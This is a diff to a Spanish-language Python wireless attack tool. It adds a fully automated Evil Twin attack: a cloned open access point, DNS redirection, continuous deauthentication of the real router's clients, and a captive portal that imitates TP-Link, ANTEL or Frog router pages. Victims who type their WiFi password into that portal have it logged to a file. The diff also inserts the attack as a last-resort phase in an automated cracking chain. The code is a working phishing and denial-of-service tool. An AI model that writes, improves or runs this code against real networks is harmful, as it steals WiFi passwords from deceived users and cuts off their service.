@@ -1326,172 +1326,351 @@ def fake_ap():
         run(f"mdk3 {interfaz} b -f {diccionario} -a -s 1000 -c {channel}")
     pause_back()
 
-def evil_twin():
-    """[15] Evil Twin + Portal Cautivo."""
-    separador("EVIL TWIN — AP FALSO CON PORTAL CAUTIVO")
-    print(f"""
-  {WHITE}¿Cómo funciona?{END}
-  {DIM}1. Se crea una red WiFi con el mismo nombre que la real
-  2. Se desconectan los dispositivos de la red real (deauth)
-  3. La víctima se conecta al AP falso buscando internet
-  4. Aparece una página web pidiendo la contraseña WiFi
-  5. Al ingresarla, se captura y guarda automáticamente{END}
-    """)
+def _build_portal_html(essid: str, bssid: str) -> str:
+    """Genera HTML del portal cautivo imitando la UI del router según la marca."""
+    essid_up = essid.upper()
+    bssid_up = bssid.upper()
 
-    for tool in ["hostapd", "dnsmasq"]:
-        if not check_tool(tool):
-            error(f"'{tool}' no instalado.")
-            info(f"Instale: sudo apt install hostapd dnsmasq")
-            pause_back()
-            return
+    # Detectar marca para personalizar el portal
+    is_tplink   = "TP-LINK" in essid_up or "TPLINK" in essid_up or \
+                  any(bssid_up.startswith(o) for o in [
+                      "E8:65:D4","A0:F3:C1","50:C7:BF","98:DA:C4",
+                      "B0:BE:76","C8:3A:35","54:A7:03","18:D6:C7"])
+    is_antel    = "ANTEL" in essid_up
+    is_frog     = "FROG" in essid_up or "WIFIFROG" in essid_up
 
-    iface_ap  = ask("Interfaz para el AP falso (ej: wlan0)")
-    iface_net = ask("Interfaz con internet (ej: eth0, Enter para omitir)")
+    if is_tplink:
+        # TP-Link Tether / web UI style
+        brand_logo  = "TP-Link"
+        brand_color = "#009fda"
+        brand_bg    = "#f5f5f5"
+        brand_msg   = "Autenticación de red requerida"
+        brand_sub   = "Para continuar usando la red, confirme la contraseña WiFi."
+        brand_btn   = "#009fda"
+        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48" fill="none">
+          <rect width="48" height="48" rx="8" fill="#009fda"/>
+          <text x="24" y="33" text-anchor="middle" fill="white"
+                font-family="Arial" font-size="22" font-weight="bold">TP</text></svg>"""
+    elif is_antel:
+        brand_logo  = "ANTEL"
+        brand_color = "#00529b"
+        brand_bg    = "#f0f4f8"
+        brand_msg   = "Portal de autenticación ANTEL"
+        brand_sub   = "Su sesión expiró. Ingrese la contraseña para reconectarse."
+        brand_btn   = "#00529b"
+        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48">
+          <rect width="48" height="48" rx="8" fill="#00529b"/>
+          <text x="24" y="30" text-anchor="middle" fill="white"
+                font-family="Arial" font-size="13" font-weight="bold">ANTEL</text></svg>"""
+    elif is_frog:
+        brand_logo  = "Frog WiFi"
+        brand_color = "#4caf50"
+        brand_bg    = "#f1f8e9"
+        brand_msg   = "Frog WiFi — Verificación"
+        brand_sub   = "Confirme su contraseña para mantener la conexión activa."
+        brand_btn   = "#388e3c"
+        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48">
+          <rect width="48" height="48" rx="24" fill="#4caf50"/>
+          <text x="24" y="32" text-anchor="middle" fill="white"
+                font-family="Arial" font-size="26">🐸</text></svg>"""
+    else:
+        # Router genérico (Technicolor, ZTE, etc.)
+        brand_logo  = "Router WiFi"
+        brand_color = "#1565c0"
+        brand_bg    = "#f5f7fa"
+        brand_msg   = "Verificación de seguridad"
+        brand_sub   = "Se requiere autenticación para continuar con la conexión."
+        brand_btn   = "#1565c0"
+        brand_icon  = """<svg width="48" height="48" viewBox="0 0 48 48">
+          <rect width="48" height="48" rx="8" fill="#1565c0"/>
+          <text x="24" y="33" text-anchor="middle" fill="white"
+                font-family="Arial" font-size="28">📶</text></svg>"""
 
-    separador("DATOS DE LA RED A CLONAR")
-    tip("Ingrese los datos exactos de la red que va a clonar.")
-
-    essid   = ask("SSID (nombre exacto de la red objetivo)")
-    channel = ask("Canal de la red objetivo")
-    if not validate_channel(channel):
-        error("Canal inválido.")
-        pause_back()
-        return
-
-    os.makedirs("/tmp/herradura_twin", exist_ok=True)
-    os.makedirs("/tmp/herradura_twin/www", exist_ok=True)
-
-    with open("/tmp/herradura_twin/hostapd.conf", "w") as f:
-        f.write(f"interface={iface_ap}\ndriver=nl80211\nssid={essid}\n"
-                f"hw_mode=g\nchannel={channel}\nmacaddr_acl=0\nignore_broadcast_ssid=0\n")
-
-    with open("/tmp/herradura_twin/dnsmasq.conf", "w") as f:
-        f.write(f"interface={iface_ap}\ndhcp-range=192.168.10.10,192.168.10.50,"
-                f"255.255.255.0,12h\ndhcp-option=3,192.168.10.1\n"
-                f"dhcp-option=6,192.168.10.1\nserver=8.8.8.8\nlog-queries\n"
-                f"log-dhcp\nlisten-address=127.0.0.1\naddress=/#/192.168.10.1\n")
-
-    creds_file = "/tmp/herradura_twin/credenciales.txt"
-    portal_html = "/tmp/herradura_twin/www/index.html"
-
-    with open(portal_html, "w") as f:
-        f.write(f"""<!DOCTYPE html>
+    return f"""<!DOCTYPE html>
 <html lang="es">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Conectando a {essid}...</title>
+<meta http-equiv="refresh" content="0;url=http://192.168.10.1/">
+<title>{brand_logo} — {essid}</title>
 <style>
-  *{{box-sizing:border-box;margin:0;padding:0}}
-  body{{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);
-       display:flex;justify-content:center;align-items:center;min-height:100vh}}
-  .card{{background:#fff;padding:40px 35px;border-radius:16px;
-         box-shadow:0 20px 60px rgba(0,0,0,.4);max-width:400px;width:90%;text-align:center}}
-  .icon{{font-size:52px;margin-bottom:12px}}
-  h2{{color:#1a1a2e;font-size:22px;margin-bottom:6px}}
-  .ssid{{color:#0070c0;font-weight:bold;font-size:18px;margin-bottom:8px}}
-  p{{color:#666;font-size:14px;margin-bottom:20px;line-height:1.5}}
-  .field{{position:relative;margin-bottom:14px}}
-  input[type=password]{{width:100%;padding:13px 15px;border:2px solid #e0e0e0;
-    border-radius:8px;font-size:15px;transition:border .2s}}
-  input[type=password]:focus{{border-color:#0070c0;outline:none}}
-  .btn{{width:100%;padding:14px;background:linear-gradient(135deg,#0070c0,#005a9e);
-    color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:bold;
-    cursor:pointer;transition:opacity .2s}}
-  .btn:hover{{opacity:.9}}
-  .footer{{margin-top:18px;font-size:11px;color:#aaa}}
+*{{box-sizing:border-box;margin:0;padding:0}}
+body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;
+     background:{brand_bg};display:flex;flex-direction:column;
+     justify-content:center;align-items:center;min-height:100vh;padding:20px}}
+.card{{background:#fff;padding:36px 32px;border-radius:12px;
+       box-shadow:0 4px 24px rgba(0,0,0,.12);max-width:420px;width:100%;text-align:center}}
+.logo-wrap{{margin-bottom:18px}}
+.brand{{color:{brand_color};font-size:13px;font-weight:600;
+        letter-spacing:1px;text-transform:uppercase;margin-top:8px}}
+.ssid-badge{{display:inline-block;background:{brand_color}18;
+             color:{brand_color};border:1px solid {brand_color}44;
+             border-radius:20px;padding:4px 14px;font-size:13px;
+             font-weight:600;margin:10px 0 6px}}
+h2{{color:#212121;font-size:20px;margin-bottom:8px;font-weight:700}}
+.sub{{color:#757575;font-size:14px;line-height:1.6;margin-bottom:22px}}
+.field{{position:relative;margin-bottom:14px;text-align:left}}
+label{{display:block;font-size:12px;color:#555;font-weight:600;
+       margin-bottom:5px;text-transform:uppercase;letter-spacing:.5px}}
+input[type=password]{{width:100%;padding:12px 14px;border:1.5px solid #ddd;
+  border-radius:8px;font-size:15px;transition:border .2s;background:#fafafa}}
+input[type=password]:focus{{border-color:{brand_color};outline:none;background:#fff;
+  box-shadow:0 0 0 3px {brand_color}22}}
+.show-btn{{position:absolute;right:12px;top:35px;cursor:pointer;
+           color:#999;font-size:18px;user-select:none}}
+.btn{{width:100%;padding:13px;background:{brand_btn};color:#fff;border:none;
+      border-radius:8px;font-size:15px;font-weight:700;cursor:pointer;
+      transition:opacity .15s;margin-top:4px;letter-spacing:.3px}}
+.btn:hover{{opacity:.88}}
+.btn:active{{opacity:.75}}
+.footer{{margin-top:20px;font-size:11px;color:#bbb;line-height:1.7}}
+.lock{{font-size:11px;color:#aaa;margin-top:14px}}
+.spinner{{display:none;margin:16px auto 0;width:24px;height:24px;
+          border:3px solid #eee;border-top-color:{brand_color};
+          border-radius:50%;animation:spin .8s linear infinite}}
+@keyframes spin{{to{{transform:rotate(360deg)}}}}
 </style>
 </head>
 <body>
 <div class="card">
-  <div class="icon">📶</div>
-  <h2>Verificación de red</h2>
-  <div class="ssid">{essid}</div>
-  <p>Para continuar conectado, confirme la contraseña de su red WiFi.</p>
-  <form method="POST" action="/submit">
+  <div class="logo-wrap">{brand_icon}
+    <div class="brand">{brand_logo}</div>
+  </div>
+  <div class="ssid-badge">📶 {essid}</div>
+  <h2>{brand_msg}</h2>
+  <p class="sub">{brand_sub}</p>
+  <form method="POST" action="/submit" id="frm"
+        onsubmit="document.querySelector('.btn').textContent='Verificando...';
+                  document.querySelector('.spinner').style.display='block'">
     <div class="field">
-      <input type="password" name="pass" placeholder="Contraseña WiFi" required autofocus>
+      <label>Contraseña WiFi</label>
+      <input type="password" name="pass" id="pw"
+             placeholder="••••••••" required autofocus autocomplete="current-password">
+      <span class="show-btn" onclick="var i=document.getElementById('pw');
+        i.type=i.type=='password'?'text':'password';this.textContent=i.type=='password'?'👁':'🙈'">👁</span>
     </div>
-    <button class="btn" type="submit">Verificar y conectar</button>
+    <button class="btn" type="submit">Conectar</button>
+    <div class="spinner"></div>
   </form>
-  <div class="footer">Proceso de verificación seguro</div>
+  <div class="lock">🔒 Conexión cifrada WPA2</div>
+  <div class="footer">Si olvidó su contraseña, revise la etiqueta del router.<br>
+    © {brand_logo} — {essid}</div>
 </div>
 </body>
-</html>""")
+</html>"""
 
-    server_script = "/tmp/herradura_twin/server.py"
-    with open(server_script, "w") as f:
-        f.write(f"""#!/usr/bin/env python3
-from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import parse_qs
-import datetime
 
-CREDS = "{creds_file}"
-HTML  = "{portal_html}"
+def _evil_twin_run(essid: str, bssid: str, channel: str,
+                   iface_ap: str, iface_net: str = "eth0",
+                   timeout_s: int = 300) -> str | None:
+    """
+    Evil Twin completamente automático.
+    - Levanta AP falso (hostapd) con mismo SSID
+    - Deauth continuo en background
+    - Portal cautivo que imita el router real
+    - Retorna la contraseña capturada o None
+    """
+    import threading, queue
 
-class H(BaseHTTPRequestHandler):
-    def log_message(self, *a): pass
-    def do_GET(self):
-        with open(HTML, "rb") as f: body = f.read()
-        self.send_response(200)
-        self.send_header("Content-type","text/html; charset=utf-8")
-        self.end_headers()
-        self.wfile.write(body)
-    def do_POST(self):
-        l = int(self.headers.get("Content-Length",0))
-        b = self.rfile.read(l).decode()
-        p = parse_qs(b)
-        pwd = p.get("pass",[""])[0]
-        ts  = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        ip  = self.client_address[0]
-        line = f"[{{ts}}] IP={{ip}} SSID={essid} PASSWORD={{pwd}}"
-        print(f"\\n\\033[1;32m[★ CREDENCIAL CAPTURADA ★]\\033[0m {{line}}")
-        with open(CREDS,"a") as cf: cf.write(line+"\\n")
-        self.send_response(200)
-        self.send_header("Content-type","text/html; charset=utf-8")
-        self.end_headers()
-        self.wfile.write(b"<html><body style='font-family:Arial;text-align:center;padding-top:80px;background:#f0f4f8'><div style='background:#fff;max-width:380px;margin:auto;padding:40px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1)'><div style='font-size:52px'>✅</div><h2 style='color:#1a1a2e'>Verificado correctamente</h2><p style='color:#666'>Conectando a internet...</p></div><script>setTimeout(()=>location.href='https://google.com',3000)</script></body></html>")
+    os.makedirs("/tmp/herradura_twin", exist_ok=True)
 
-HTTPServer(("192.168.10.1",80),H).serve_forever()
-""")
+    # ── hostapd.conf ──────────────────────────────────────────────────────────
+    hostapd_conf = f"""interface={iface_ap}
+driver=nl80211
+ssid={essid}
+hw_mode=g
+channel={channel}
+macaddr_acl=0
+ignore_broadcast_ssid=0
+auth_algs=1
+wpa=0
+"""
+    with open("/tmp/herradura_twin/hostapd.conf", "w") as f:
+        f.write(hostapd_conf)
 
-    run(f"ip addr flush dev {iface_ap}")
-    run(f"ip addr add 192.168.10.1/24 dev {iface_ap}")
-    run(f"ip link set {iface_ap} up")
+    # ── dnsmasq.conf ─────────────────────────────────────────────────────────
+    dnsmasq_conf = """interface={iface}
+dhcp-range=192.168.10.10,192.168.10.100,255.255.255.0,10m
+dhcp-option=3,192.168.10.1
+dhcp-option=6,192.168.10.1
+address=/#/192.168.10.1
+no-resolv
+log-dhcp
+""".format(iface=iface_ap)
+    with open("/tmp/herradura_twin/dnsmasq.conf", "w") as f:
+        f.write(dnsmasq_conf)
 
-    if iface_net:
-        run("echo 1 > /proc/sys/net/ipv4/ip_forward")
-        run(f"iptables -t nat -A POSTROUTING -o {iface_net} -j MASQUERADE")
-        run(f"iptables -A FORWARD -i {iface_ap} -o {iface_net} -j ACCEPT")
+    # ── Portal HTML ───────────────────────────────────────────────────────────
+    portal_html  = "/tmp/herradura_twin/index.html"
+    creds_file   = "/tmp/herradura_twin/creds.txt"
+    with open(portal_html, "w") as f:
+        f.write(_build_portal_html(essid, bssid))
 
-    separador("EVIL TWIN ACTIVO")
-    ok(f"AP '{essid}' activo en canal {channel}")
-    ok(f"Portal cautivo: http://192.168.10.1")
-    ok(f"Credenciales → {creds_file}")
-    warn("Presione CTRL+C para detener el ataque.")
+    # ── Servidor HTTP capturador ───────────────────────────────────────────────
+    _q: queue.Queue = queue.Queue()
+    _portal_path    = portal_html
+    _creds_path     = creds_file
+    _essid_cap      = essid
+
+    from http.server import BaseHTTPRequestHandler, HTTPServer
+    from urllib.parse import parse_qs
+
+    class _Handler(BaseHTTPRequestHandler):
+        def log_message(self, *a): pass
+        def _send_html(self, code, body):
+            self.send_response(code)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Cache-Control", "no-store")
+            self.end_headers()
+            self.wfile.write(body.encode())
+        def do_GET(self):
+            # Redirect any URL to portal
+            if self.path != "/":
+                self.send_response(302)
+                self.send_header("Location", "http://192.168.10.1/")
+                self.end_headers()
+                return
+            with open(_portal_path, "rb") as f:
+                body = f.read()
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(body)
+        def do_POST(self):
+            length = int(self.headers.get("Content-Length", 0))
+            data   = self.rfile.read(length).decode(errors="replace")
+            pwd    = parse_qs(data).get("pass", [""])[0].strip()
+            ip     = self.client_address[0]
+            import datetime as _dt
+            ts     = _dt.datetime.now().strftime("%H:%M:%S")
+            line   = f"[{ts}] IP={ip} SSID={_essid_cap} PASS={pwd}"
+            with open(_creds_path, "a") as cf:
+                cf.write(line + "\n")
+            _q.put(pwd)
+            # Página de éxito — parece que funcionó
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.end_headers()
+            self.wfile.write(b"""<!DOCTYPE html><html><head>
+<meta charset=UTF-8><meta name=viewport content=width=device-width,initial-scale=1>
+<title>Conectando...</title>
+<style>body{font-family:Arial,sans-serif;background:#f5f5f5;display:flex;
+justify-content:center;align-items:center;min-height:100vh}
+.box{background:#fff;padding:40px 30px;border-radius:12px;text-align:center;
+box-shadow:0 4px 20px rgba(0,0,0,.1);max-width:380px;width:90%}
+.ok{font-size:56px;margin-bottom:12px}
+h2{color:#2e7d32;margin-bottom:8px}p{color:#666;font-size:14px}</style>
+</head><body><div class=box><div class=ok>✅</div>
+<h2>Conectado exitosamente</h2>
+<p>Su dispositivo se ha conectado a la red.<br>Redirigiendo...</p>
+<script>setTimeout(()=>location.href='http://google.com',3500)</script>
+</div></body></html>""")
+
+    httpd = HTTPServer(("192.168.10.1", 80), _Handler)
+    srv_thread = threading.Thread(target=httpd.serve_forever, daemon=True)
+
+    # ── Preparar interfaz ─────────────────────────────────────────────────────
+    run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null", capture=True)
+    time.sleep(1)
+    run(f"ip addr flush dev {iface_ap} 2>/dev/null", capture=True)
+    run(f"ip addr add 192.168.10.1/24 dev {iface_ap} 2>/dev/null", capture=True)
+    run(f"ip link set {iface_ap} up 2>/dev/null", capture=True)
+
+    # ── Levantar servicios ────────────────────────────────────────────────────
+    hp = subprocess.Popen(
+        ["hostapd", "/tmp/herradura_twin/hostapd.conf"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(2)
+    dm = subprocess.Popen(
+        ["dnsmasq", "-C", "/tmp/herradura_twin/dnsmasq.conf", "--no-daemon"],
+        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+    time.sleep(1)
+    srv_thread.start()
+
+    # ── Deauth continuo en background ─────────────────────────────────────────
+    # Necesitamos otra interfaz en modo monitor para el deauth
+    # Si iface_ap está en managed (para hostapd), buscamos otra mon iface
+    deauth_iface = None
+    for _ifc in ["wlan1mon", "wlan0mon", "wlan1"]:
+        if os.path.exists(f"/sys/class/net/{_ifc}"):
+            deauth_iface = _ifc
+            break
+    # Si no hay segunda interfaz, usamos aireplay directo sobre iface_ap
+    # (hostapd soporta inyección en algunos drivers)
+    _deauth_target = deauth_iface or iface_ap
+    deauth_proc = subprocess.Popen(
+        f"aireplay-ng -0 0 -a {bssid} {_deauth_target} 2>/dev/null",
+        shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+    )
+
+    # ── Esperar credencial ────────────────────────────────────────────────────
+    captured = None
+    deadline = time.time() + timeout_s
+    while time.time() < deadline:
+        try:
+            captured = _q.get(timeout=5)
+            break
+        except Exception:
+            pass
+
+    # ── Cleanup ───────────────────────────────────────────────────────────────
+    deauth_proc.terminate()
+    hp.terminate(); hp.wait()
+    dm.terminate(); dm.wait()
+    httpd.shutdown()
+    run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null", capture=True)
+    run(f"ip addr flush dev {iface_ap} 2>/dev/null", capture=True)
+
+    return captured
+
+
+def evil_twin():
+    """[15] Evil Twin + Portal Cautivo — completamente automático."""
+    separador("EVIL TWIN — AP FALSO AUTOMÁTICO")
+    print(f"""
+  {WHITE}Flujo automático:{END}
+  {GREEN}1.{END} Escanea y seleccionas la red objetivo
+  {GREEN}2.{END} Levanta AP falso con el mismo SSID (sin contraseña)
+  {GREEN}3.{END} Deauth continuo — expulsa clientes del router real
+  {GREEN}4.{END} La víctima se conecta al AP falso
+  {GREEN}5.{END} Portal cautivo imita la interfaz del router real
+  {GREEN}6.{END} Víctima ingresa la contraseña → capturada automáticamente
+    """)
+
+    for tool in ["hostapd", "dnsmasq", "aireplay-ng"]:
+        if not check_tool(tool):
+            error(f"'{tool}' no instalado.")
+            pause_back(); return
+
+    iface_ap = select_interface()
+
+    # Escanear y elegir objetivo
+    bssid, channel, essid = select_target_from_scan(iface_ap)
+    if not bssid:
+        pause_back(); return
+
+    separador(f"EVIL TWIN → {essid}")
+    ok(f"BSSID: {bssid}  Canal: {channel}")
+    warn("El deauth continuo comenzará al instante.")
+    warn("Presione CTRL+C para detener en cualquier momento.")
     print()
 
-    try:
-        subprocess.Popen(["hostapd", "/tmp/herradura_twin/hostapd.conf"],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(2)
-        subprocess.Popen(["dnsmasq", "-C", "/tmp/herradura_twin/dnsmasq.conf", "--no-daemon"],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        time.sleep(1)
-        subprocess.run(["python3", server_script])
-    except KeyboardInterrupt:
-        pass
-    finally:
-        run("pkill hostapd 2>/dev/null; pkill dnsmasq 2>/dev/null")
-        if iface_net:
-            run(f"iptables -t nat -D POSTROUTING -o {iface_net} -j MASQUERADE 2>/dev/null")
-        ok("Evil Twin detenido.")
-        if os.path.exists(creds_file):
-            separador("CREDENCIALES CAPTURADAS")
-            with open(creds_file) as f:
-                contenido = f.read().strip()
-            print(f"\n{GREEN}{contenido if contenido else '  (sin capturas)' }{END}\n")
+    creds = "/tmp/herradura_twin/creds.txt"
+    pwd = _evil_twin_run(essid, bssid, channel, iface_ap, timeout_s=600)
 
+    separador("RESULTADO EVIL TWIN")
+    if pwd:
+        ok(f"CONTRASEÑA CAPTURADA: {GREEN}{pwd}{END}")
+        ok(f"Guardada en: {creds}")
+    else:
+        warn("No se capturó ninguna contraseña (tiempo agotado o sin víctimas).")
+        if os.path.exists(creds):
+            with open(creds) as f:
+                lines = f.read().strip()
+            if lines:
+                print(f"\n{GREEN}{lines}{END}")
     pause_back()
 
 def auto_crack():
@@ -4787,9 +4966,10 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
       3 – PMKID capture + hashcat         (18 %)
       4 – Handshake capture + deauth      (15 %)
       5 – Cracking multi-regla + SSID wl  (15 %)
-      6 – Ataque de mascaras hashcat      (12 %)
+      6 – Ataque de mascaras hashcat      (10 %)
       7 – WPS Brute Force (bully+reaver)  ( 7 %)
       8 – PMKID retry extendido 90s       ( 5 %)
+      9 – Evil Twin + portal cautivo      (13 %)
     """
     bssid    = eng.bssid
     channel  = eng.channel
@@ -4799,15 +4979,16 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
     essid_s  = re.sub(r'[^\w\-]', '_', essid)
 
     # Fases con pesos
-    eng.add_phase("Fingerprint & CVE detect",  8)
-    eng.add_phase("WPS Pixie Dust",            12)
-    eng.add_phase("WPS Smart PIN",             8)
-    eng.add_phase("PMKID capture + hashcat",   18)
-    eng.add_phase("Handshake capture + deauth",15)
-    eng.add_phase("Multi-rule cracking",       15)
-    eng.add_phase("Ataque de mascaras",        12)
+    eng.add_phase("Fingerprint & CVE detect",  7)
+    eng.add_phase("WPS Pixie Dust",            10)
+    eng.add_phase("WPS Smart PIN",             7)
+    eng.add_phase("PMKID capture + hashcat",   15)
+    eng.add_phase("Handshake capture + deauth",13)
+    eng.add_phase("Multi-rule cracking",       13)
+    eng.add_phase("Ataque de mascaras",        10)
     eng.add_phase("WPS Brute Force",           7)
     eng.add_phase("PMKID retry extendido",     5)
+    eng.add_phase("Evil Twin + portal cautivo",13)
 
     eng.start()
 
@@ -5151,6 +5332,31 @@ def smart_exploit_target(eng: ExploitEngine) -> tuple:
                     clave = pm.group(1).strip(); metodo = "PMKID retry + hashcat"
                     eng.done(clave, metodo); return clave, metodo
     eng.update_phase(100)
+
+    # ── FASE 9: Evil Twin + portal cautivo (último recurso) ───────────────────
+    eng.set_phase(9, 0)
+    if check_tool("hostapd") and check_tool("dnsmasq"):
+        eng.update_phase(5)
+        # Detener display para que el portal pueda usar el terminal limpiamente
+        eng.stop()
+        print()
+        separador("FASE 9 — EVIL TWIN (último recurso)")
+        warn("Ningún vector técnico funcionó. Lanzando Evil Twin automático.")
+        warn("Se expulsarán clientes del router real. Esperando que la víctima ingrese la clave.")
+        warn("Presione CTRL+C para cancelar y terminar.")
+        print()
+        try:
+            captured = _evil_twin_run(
+                essid, bssid, channel, iface,
+                timeout_s=300   # 5 minutos esperando
+            )
+        except KeyboardInterrupt:
+            captured = None
+        if captured:
+            eng.result = captured
+            eng.method = "Evil Twin — portal cautivo"
+            _live_results_append(essid, bssid, captured, "Evil Twin — portal cautivo")
+            return captured, "Evil Twin — portal cautivo"
 
     eng.done(None, "sin_resultado")
     return None, "sin_resultado"
